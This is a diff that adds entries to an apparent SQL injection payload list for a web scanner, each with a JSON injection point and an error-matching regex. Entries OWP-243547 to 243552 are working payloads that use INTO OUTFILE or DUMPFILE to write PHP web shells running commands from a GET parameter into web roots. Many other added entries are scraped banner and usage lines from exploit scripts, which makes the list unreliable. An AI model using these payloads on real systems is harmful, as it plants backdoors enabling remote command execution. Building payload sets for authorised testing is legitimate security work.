@@ -251,5 +251,291 @@
       "expected_status_code": 200,
       "success_regex": "error|sql|syntax"
     }
+  },
+  {
+    "payload_id": "OWP-243358",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] Injection",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243359",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] msdb",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243360",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] tempdb",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243362",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] Profiles",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243363",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] Roles",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243364",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] Users",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243366",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] UserId",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243367",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] UserName",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243547",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243548",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243549",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243550",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243551",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-243552",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-407702",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[RANDSTR1],",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408116",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[1] Injecting some SQL statements in admin login username field...\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408218",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] PHP X 3.5.16 (news_id) Remote SQL Injection Exploit\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408232",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]Blind SQL injection [+]\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408302",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[OPTION]  = 0 = SQL Injection (Admin user & hash retrieval)\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408315",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]Blind SQL injection                [+]\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408338",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*]Tribisur <= 2.0 Remote SQL Injection Exploit\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408339",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*]Mode: 1  -SQL Injection in cat_main.php-\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408341",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*]DCP Portal <= 6.11 Remote SQL Injection Exploit\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408364",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]Blind SQL injection\t [+]\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408375",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[?] (Remote\\Blind) SQL Injection\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-408383",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[~] Usage : php mytopix130-sql.php <target_host> <path> <username> <user-pass>\\r\\n\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
   }
 ]
